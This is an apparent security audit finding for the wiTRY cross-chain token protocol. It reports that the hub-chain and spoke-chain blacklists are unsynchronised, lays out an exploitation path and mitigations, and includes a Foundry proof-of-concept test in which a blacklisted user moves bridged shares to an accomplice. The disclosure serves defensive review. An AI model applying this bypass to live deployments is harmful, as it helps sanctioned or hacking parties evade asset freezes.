## Title
Cross-Chain Blacklist Bypass: Independent Blacklist Systems Allow Sanctioned Users to Operate on Alternate Chains

## Summary
The wiTRY cross-chain architecture implements separate, unsynchronized blacklist systems on the hub chain (StakediTry) and spoke chain (wiTryOFT). A user blacklisted on one chain can freely transfer and operate with their shares on another chain, completely bypassing sanctions enforcement.

## Impact
**Severity**: High

## Finding Description
**Location:** [1](#0-0)  and [2](#0-1) 

**Intended Logic:** The protocol should enforce blacklist restrictions across all user operations to prevent sanctioned addresses from accessing their funds. [3](#0-2)  states "Blacklisted users cannot send/receive/mint/burn iTry tokens in any case." The README also emphasizes concern about [4](#0-3)  "blacklist/whitelist bugs that would impair rescue operations in case of hacks or similar black swan events."

**Actual Logic:** The hub chain uses role-based blacklisting via `FULL_RESTRICTED_STAKER_ROLE` and `SOFT_RESTRICTED_STAKER_ROLE` [5](#0-4) , while the spoke chain uses a completely separate mapping-based blacklist system [6](#0-5) . The hub chain adapter (wiTryOFTAdapter) contains no blacklist functionality whatsoever [7](#0-6) . There is no synchronization mechanism between these independent systems.

**Exploitation Path:**
1. **Pre-sanction bridging**: User bridges wiTRY shares from hub chain to spoke chain via `wiTryOFTAdapter.send()` while not blacklisted. The shares are locked on hub chain and minted on spoke chain [8](#0-7) .

2. **Hub chain blacklisting**: User engages in illicit activity. Blacklist Manager calls `StakediTry.addToBlacklist(attacker, true)` on hub chain, granting `FULL_RESTRICTED_STAKER_ROLE` [9](#0-8) . User's hub chain shares are now frozen via transfer restrictions [10](#0-9) .

3. **Spoke chain bypass**: On spoke chain, `wiTryOFT.blackList[attacker]` remains `false` because blacklists are independent. The attacker's wiTRY OFT token balance is unaffected by hub chain blacklist [11](#0-10) .

4. **Sanctions evasion**: Attacker freely transfers wiTRY OFT tokens on spoke chain to accomplices or DEX protocols. The `_beforeTokenTransfer` hook only checks the spoke chain's local blacklist [11](#0-10) , which doesn't include the attacker.

**Security Property Broken:** Violates the protocol's blacklist enforcement invariant and undermines the ability to freeze sanctioned users' assets for "rescue operations in case of hacks or similar black swan events."

## Impact Explanation
- **Affected Assets**: All wiTRY shares that users bridge to spoke chains before being blacklisted on the hub chain
- **Damage Severity**: Sanctioned users retain full control over their bridged shares, can transfer to other addresses, sell on DEXes, or convert back to value. This completely defeats the purpose of blacklisting for compliance, hack recovery, or regulatory enforcement.
- **User Impact**: Any user can preemptively bridge shares before potential sanctions, then operate freely on alternate chains. Protocol cannot enforce freezes across its entire ecosystem.

## Likelihood Explanation
- **Attacker Profile**: Any wiTRY holder who anticipates potential sanctions (hacker, sanctioned entity, insider with advance warning)
- **Preconditions**: User must bridge shares to spoke chain before being blacklisted on hub chain. Since bridging is a normal operation, sophisticated attackers can preemptively position assets.
- **Execution Complexity**: Simple - requires only a single cross-chain bridge transaction before sanctions occur, then normal transfers on spoke chain after blacklisting
- **Frequency**: Can be exploited by any user, continuously. Each blacklisted user with pre-bridged shares can bypass sanctions indefinitely on alternate chains.

## Recommendation

Implement a unified blacklist oracle or cross-chain synchronization mechanism:

```solidity
// In src/token/wiTRY/crosschain/wiTryOFT.sol

// Add hub chain blacklist validation via LayerZero messages
function _beforeTokenTransfer(address _from, address _to, uint256 _amount) internal override {
    // Check local blacklist (existing)
    if (blackList[_from]) revert BlackListed(_from);
    if (blackList[_to]) revert BlackListed(_to);
    if (blackList[msg.sender]) revert BlackListed(msg.sender);
    
    // ADD: Query hub chain blacklist status via cross-chain message
    // or maintain synchronized blacklist via admin messages
    _validateHubChainBlacklist(_from);
    _validateHubChainBlacklist(_to);
    
    super._beforeTokenTransfer(_from, _to, _amount);
}

// Alternative: Implement mandatory blacklist sync when bridging
// in wiTryOFTAdapter to check/update spoke chain blacklists
```

**Alternative Mitigation:** 
1. Implement a "global blacklist manager" smart contract on hub chain that spoke chains query via LayerZero before transfers
2. Require blacklist managers to manually sync blacklists across all chains when adding entries
3. Add grace periods before blacklisted users' spoke chain shares can be redistributed, allowing time for cross-chain enforcement

## Proof of Concept

```solidity
// File: test/Exploit_CrossChainBlacklistBypass.t.sol
// Run with: forge test --match-test test_CrossChainBlacklistBypass -vvv

pragma solidity ^0.8.20;

import {CrossChainTestBase} from "./crosschainTests/crosschain/CrossChainTestBase.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MessagingFee, SendParam} from "@layerzerolabs/lz-evm-oapp-v2/contracts/oft/interfaces/IOFT.sol";
import {OptionsBuilder} from "@layerzerolabs/lz-evm-oapp-v2/contracts/oapp/libs/OptionsBuilder.sol";

contract Exploit_CrossChainBlacklistBypass is CrossChainTestBase {
    using OptionsBuilder for bytes;

    uint256 constant INITIAL_DEPOSIT = 100 ether;
    uint256 constant SHARES_TO_BRIDGE = 50 ether;
    uint128 constant GAS_LIMIT = 200000;

    bytes32 constant BLACKLIST_MANAGER_ROLE = keccak256("BLACKLIST_MANAGER_ROLE");
    bytes32 constant FULL_RESTRICTED_STAKER_ROLE = keccak256("FULL_RESTRICTED_STAKER_ROLE");

    function setUp() public override {
        super.setUp();
        deployAllContracts();
        
        console.log("\n=== Exploit: Cross-Chain Blacklist Bypass ===");
    }

    function test_CrossChainBlacklistBypass() public {
        // SETUP: User deposits and bridges shares to spoke chain BEFORE being blacklisted
        vm.selectFork(sepoliaForkId);
        
        // Mint iTRY and deposit into vault
        vm.prank(deployer);
        sepoliaITryToken.mint(userL1, INITIAL_DEPOSIT);
        
        vm.startPrank(userL1);
        sepoliaITryToken.approve(address(sepoliaVault), INITIAL_DEPOSIT);
        sepoliaVault.deposit(INITIAL_DEPOSIT, userL1);
        
        // Bridge shares to spoke chain
        sepoliaVault.approve(address(sepoliaShareAdapter), SHARES_TO_BRIDGE);
        
        bytes memory options = OptionsBuilder.newOptions().addExecutorLzReceiveOption(GAS_LIMIT, 0);
        SendParam memory sendParam = SendParam({
            dstEid: OP_SEPOLIA_EID,
            to: bytes32(uint256(uint160(userL1))),
            amountLD: SHARES_TO_BRIDGE,
            minAmountLD: SHARES_TO_BRIDGE,
            extraOptions: options,
            composeMsg: "",
            oftCmd: ""
        });
        
        MessagingFee memory fee = sepoliaShareAdapter.quoteSend(sendParam, false);
        
        vm.recordLogs();
        sepoliaShareAdapter.send{value: fee.nativeFee}(sendParam, fee, payable(userL1));
        vm.stopPrank();
        
        // Relay message to spoke chain
        CrossChainMessage memory message = captureMessage(SEPOLIA_EID, OP_SEPOLIA_EID);
        relayMessage(message);
        
        console.log("\n1. User bridged shares to spoke chain:");
        vm.selectFork(opSepoliaForkId);
        uint256 userSharesOnSpoke = opSepoliaShareOFT.balanceOf(userL1);
        console.log("   Spoke chain balance:", userSharesOnSpoke);
        assertEq(userSharesOnSpoke, SHARES_TO_BRIDGE, "Shares bridged successfully");
        
        // EXPLOIT: User gets blacklisted on HUB chain for illicit activity
        vm.selectFork(sepoliaForkId);
        vm.prank(deployer);
        sepoliaVault.grantRole(BLACKLIST_MANAGER_ROLE, deployer);
        
        vm.prank(deployer);
        sepoliaVault.addToBlacklist(userL1, true); // Full blacklist
        
        console.log("\n2. User blacklisted on HUB chain");
        bool isBlacklisted = sepoliaVault.hasRole(FULL_RESTRICTED_STAKER_ROLE, userL1);
        console.log("   Hub chain blacklisted:", isBlacklisted);
        assertTrue(isBlacklisted, "User should be blacklisted on hub");
        
        // Verify hub chain transfers are blocked
        vm.selectFork(sepoliaForkId);
        uint256 remainingShares = sepoliaVault.balanceOf(userL1);
        console.log("   Hub chain remaining shares:", remainingShares);
        
        vm.prank(userL1);
        vm.expectRevert();
        sepoliaVault.transfer(userL2, remainingShares); // Should fail
        console.log("   Hub chain transfer: BLOCKED (as expected)");
        
        // VULNERABILITY: Spoke chain shares are NOT affected by hub chain blacklist
        vm.selectFork(opSepoliaForkId);
        bool isBlacklistedOnSpoke = opSepoliaShareOFT.blackList(userL1);
        console.log("\n3. Checking spoke chain blacklist status:");
        console.log("   Spoke chain blacklisted:", isBlacklistedOnSpoke);
        assertFalse(isBlacklistedOnSpoke, "User should NOT be blacklisted on spoke - this is the vulnerability!");
        
        // User can freely transfer on spoke chain, bypassing sanctions
        vm.prank(userL1);
        opSepoliaShareOFT.transfer(userL2, SHARES_TO_BRIDGE);
        
        uint256 userL2Balance = opSepoliaShareOFT.balanceOf(userL2);
        console.log("\n4. EXPLOIT SUCCESS - Sanctions bypassed:");
        console.log("   User transferred shares to accomplice on spoke chain");
        console.log("   Accomplice balance:", userL2Balance);
        assertEq(userL2Balance, SHARES_TO_BRIDGE, "Blacklisted user successfully bypassed sanctions!");
        
        console.log("\n=== VULNERABILITY CONFIRMED ===");
        console.log("Blacklisted user on hub chain can operate freely on spoke chain!");
    }
    
    // Helper function from CrossChainTestBase (simplified for PoC)
    function deployAllContracts() internal {
        // Deploy hub chain contracts
        vm.selectFork(sepoliaForkId);
        vm.startPrank(deployer);
        
        sepoliaITryImplementation = new iTry();
        bytes memory initData = abi.encodeWithSelector(iTry.initialize.selector, deployer, deployer);
        sepoliaITryProxy = new ERC1967Proxy(address(sepoliaITryImplementation), initData);
        sepoliaITryToken = iTry(address(sepoliaITryProxy));
        
        sepoliaVault = new StakediTryCrosschain(IERC20(address(sepoliaITryToken)), deployer, deployer);
        sepoliaShareAdapter = new wiTryOFTAdapter(address(sepoliaVault), SEPOLIA_ENDPOINT, deployer);
        
        vm.stopPrank();
        
        // Deploy spoke chain contracts
        vm.selectFork(opSepoliaForkId);
        vm.startPrank(deployer);
        
        opSepoliaShareOFT = new wiTryOFT("wiTRY", "wiTRY", OP_SEPOLIA_ENDPOINT, deployer);
        
        vm.stopPrank();
        
        // Set peers
        vm.selectFork(sepoliaForkId);
        vm.prank(deployer);
        sepoliaShareAdapter.setPeer(OP_SEPOLIA_EID, bytes32(uint256(uint160(address(opSepoliaShareOFT)))));
        
        vm.selectFork(opSepoliaForkId);
        vm.prank(deployer);
        opSepoliaShareOFT.setPeer(SEPOLIA_EID, bytes32(uint256(uint160(address(sepoliaShareAdapter)))));
    }
}
```

## Notes

This vulnerability is particularly critical because:

1. **Preemptive Positioning**: Sophisticated actors can bridge assets before sanctions occur, making enforcement impossible after the fact.

2. **Multi-Chain Complexity**: The protocol's cross-chain architecture inherently creates multiple jurisdictions for blacklist enforcement, but lacks the infrastructure to unify them.

3. **Trusted Role Limitation**: Even trusted Blacklist Managers must manually coordinate across chains, which is slow and error-prone during emergency situations like active hacks.

4. **Protocol Design Goal**: The README explicitly emphasizes importance of blacklist functionality for "rescue operations in case of hacks or similar black swan events," making this bypass a critical failure of a core security mechanism.

The vulnerability cannot be dismissed as a known issue because the Zellic audit finding about allowance-based transfers is unrelated to cross-chain blacklist inconsistency. This is a fundamental architectural flaw in the multi-chain blacklist design.

### Citations

**File:** src/token/wiTRY/crosschain/wiTryOFT.sol (L11-23)
```text
 * Architecture (Phase 1 - Instant Redeems):
 * - Hub Chain (Ethereum): StakediTry (vault) + wiTryOFTAdapter (locks shares)
 * - Spoke Chain (MegaETH): wiTryOFT (mints/burns based on messages)
 *
 * Flow from Hub to Spoke:
 * 1. Hub adapter locks native wiTRY shares
 * 2. LayerZero message sent to this contract
 * 3. This contract mints equivalent OFT share tokens
 *
 * Flow from Spoke to Hub:
 * 1. This contract burns OFT share tokens
 * 2. LayerZero message sent to hub adapter
 * 3. Hub adapter unlocks native wiTRY shares
```

**File:** src/token/wiTRY/crosschain/wiTryOFT.sol (L29-74)
```text
    // Address of the entity authorized to manage the blacklist
    address public blackLister;

    // Mapping to track blacklisted users
    mapping(address => bool) public blackList;

    // Events emitted on changes to the blacklist or fund redistribution
    event BlackListerSet(address indexed blackLister);
    event BlackListUpdated(address indexed user, bool isBlackListed);
    event RedistributeFunds(address indexed user, uint256 amount);

    // Errors to be thrown in case of restricted actions
    error BlackListed(address user);
    error NotBlackListed();
    error OnlyBlackLister();

    /**
     * @dev Constructor to initialize the wiTryOFT contract.
     * @param _name The name of the token.
     * @param _symbol The symbol of the token.
     * @param _lzEndpoint Address of the LZ endpoint.
     * @param _delegate Address of the delegate.
     */
    constructor(string memory _name, string memory _symbol, address _lzEndpoint, address _delegate)
        OFT(_name, _symbol, _lzEndpoint, _delegate)
    {}

    /**
     * @dev Sets the address authorized to manage the blacklist. Only callable by the owner.
     * @param _blackLister Address of the entity authorized to manage the blacklist.
     */
    function setBlackLister(address _blackLister) external onlyOwner {
        blackLister = _blackLister;
        emit BlackListerSet(_blackLister);
    }

    /**
     * @dev Updates the blacklist status of a user.
     * @param _user The user identifier to update.
     * @param _isBlackListed Boolean indicating whether the user should be blacklisted or not.
     */
    function updateBlackList(address _user, bool _isBlackListed) external {
        if (msg.sender != blackLister && msg.sender != owner()) revert OnlyBlackLister();
        blackList[_user] = _isBlackListed;
        emit BlackListUpdated(_user, _isBlackListed);
    }
```

**File:** src/token/wiTRY/crosschain/wiTryOFT.sol (L105-110)
```text
    function _beforeTokenTransfer(address _from, address _to, uint256 _amount) internal override {
        if (blackList[_from]) revert BlackListed(_from);
        if (blackList[_to]) revert BlackListed(_to);
        if (blackList[msg.sender]) revert BlackListed(msg.sender);
        super._beforeTokenTransfer(_from, _to, _amount);
    }
```

**File:** src/token/wiTRY/StakediTry.sol (L26-143)
```text
    bytes32 private constant BLACKLIST_MANAGER_ROLE = keccak256("BLACKLIST_MANAGER_ROLE");
    /// @notice The role which prevents an address to stake
    bytes32 private constant SOFT_RESTRICTED_STAKER_ROLE = keccak256("SOFT_RESTRICTED_STAKER_ROLE");
    /// @notice The role which prevents an address to transfer, stake, or unstake. The owner of the contract can redirect address staking balance if an address is in full restricting mode.
    bytes32 private constant FULL_RESTRICTED_STAKER_ROLE = keccak256("FULL_RESTRICTED_STAKER_ROLE");
    /// @notice Minimum non-zero shares amount to prevent donation attack
    uint256 private constant MIN_SHARES = 1 ether;
    /// @notice Minimum allowed vesting period (1 hour)
    uint256 private constant MIN_VESTING_PERIOD = 1 hours;
    /// @notice Maximum allowed vesting period (30 days)
    uint256 private constant MAX_VESTING_PERIOD = 30 days;

    /* ------------- STATE VARIABLES ------------- */

    /// @notice The amount of the last asset distribution from the controller contract into this
    /// contract + any unvested remainder at that time
    uint256 public vestingAmount;

    /// @notice The timestamp of the last asset distribution from the controller contract into this contract
    uint256 public lastDistributionTimestamp;

    /// @notice The vesting period of lastDistributionAmount over which it increasingly becomes available to stakers
    uint256 private vestingPeriod;

    /* ------------- MODIFIERS ------------- */

    /// @notice ensure input amount nonzero
    modifier notZero(uint256 amount) {
        if (amount == 0) revert InvalidAmount();
        _;
    }

    /// @notice ensures blacklist target is not owner
    modifier notOwner(address target) {
        if (target == owner()) revert CantBlacklistOwner();
        _;
    }

    /* ------------- CONSTRUCTOR ------------- */

    /**
     * @notice Constructor for StakediTry contract.
     * @param _asset The address of the iTry token.
     * @param _initialRewarder The address of the initial rewarder.
     * @param _owner The address of the admin role.
     *
     */
    constructor(IERC20 _asset, address _initialRewarder, address _owner)
        ERC20("wiTRY", "wiTRY")
        ERC4626(_asset)
        ERC20Permit("wiTRY")
    {
        if (_owner == address(0) || _initialRewarder == address(0) || address(_asset) == address(0)) {
            revert InvalidZeroAddress();
        }

        vestingPeriod = MIN_VESTING_PERIOD;

        _grantRole(REWARDER_ROLE, _initialRewarder);
        _grantRole(DEFAULT_ADMIN_ROLE, _owner);
    }

    /* ------------- EXTERNAL ------------- */

    /**
     * @notice Allows the owner to update the vesting period.
     * @dev Can only be called when there are no unvested rewards to avoid disrupting active vesting.
     * @param _vestingPeriod The new vesting period (must be between MIN_VESTING_PERIOD and MAX_VESTING_PERIOD).
     */
    function setVestingPeriod(uint256 _vestingPeriod) external onlyRole(DEFAULT_ADMIN_ROLE) {
        if (_vestingPeriod < MIN_VESTING_PERIOD || _vestingPeriod > MAX_VESTING_PERIOD) {
            revert InvalidVestingPeriod();
        }
        if (getUnvestedAmount() > 0) {
            revert StillVesting();
        }

        uint256 oldVestingPeriod = vestingPeriod;
        vestingPeriod = _vestingPeriod;

        emit VestingPeriodUpdated(oldVestingPeriod, _vestingPeriod);
    }

    /**
     * @notice Allows the owner to transfer rewards from the controller contract into this contract.
     * @param amount The amount of rewards to transfer.
     */
    function transferInRewards(uint256 amount) external nonReentrant onlyRole(REWARDER_ROLE) notZero(amount) {
        _updateVestingAmount(amount);
        // transfer assets from rewarder to this contract
        IERC20(asset()).safeTransferFrom(msg.sender, address(this), amount);

        emit RewardsReceived(amount);
    }

    /**
     * @notice Allows the owner (DEFAULT_ADMIN_ROLE) and blacklist managers to blacklist addresses.
     * @param target The address to blacklist.
     * @param isFullBlacklisting Soft or full blacklisting level.
     */
    function addToBlacklist(address target, bool isFullBlacklisting)
        external
        onlyRole(BLACKLIST_MANAGER_ROLE)
        notOwner(target)
    {
        bytes32 role = isFullBlacklisting ? FULL_RESTRICTED_STAKER_ROLE : SOFT_RESTRICTED_STAKER_ROLE;
        _grantRole(role, target);
    }

    /**
     * @notice Allows the owner (DEFAULT_ADMIN_ROLE) and blacklist managers to un-blacklist addresses.
     * @param target The address to un-blacklist.
     * @param isFullBlacklisting Soft or full blacklisting level.
     */
    function removeFromBlacklist(address target, bool isFullBlacklisting) external onlyRole(BLACKLIST_MANAGER_ROLE) {
        bytes32 role = isFullBlacklisting ? FULL_RESTRICTED_STAKER_ROLE : SOFT_RESTRICTED_STAKER_ROLE;
        _revokeRole(role, target);
    }
```

**File:** src/token/wiTRY/StakediTry.sol (L292-299)
```text
    function _beforeTokenTransfer(address from, address to, uint256) internal virtual override {
        if (hasRole(FULL_RESTRICTED_STAKER_ROLE, from) && to != address(0)) {
            revert OperationNotAllowed();
        }
        if (hasRole(FULL_RESTRICTED_STAKER_ROLE, to)) {
            revert OperationNotAllowed();
        }
    }
```

**File:** README.md (L112-112)
```markdown
The issues we are most concerned are those related to unbacked minting of iTry, the theft or loss of funds when staking/unstaking (particularly crosschain), and blacklist/whitelist bugs that would impair rescue operations in case of hacks or similar black swan events. More generally, the areas we want to verify are:
```

**File:** README.md (L124-124)
```markdown
- Blacklisted users cannot send/receive/mint/burn iTry tokens in any case.
```

**File:** src/token/wiTRY/crosschain/wiTryOFTAdapter.sol (L26-33)
```text
contract wiTryOFTAdapter is OFTAdapter {
    /**
     * @notice Constructor for wiTryOFTAdapter
     * @param _token Address of the wiTRY share token from StakedUSDe
     * @param _lzEndpoint LayerZero endpoint address for Ethereum Mainnet
     * @param _owner Address that will own this adapter (typically deployer)
     */
    constructor(address _token, address _lzEndpoint, address _owner) OFTAdapter(_token, _lzEndpoint, _owner) {}
```
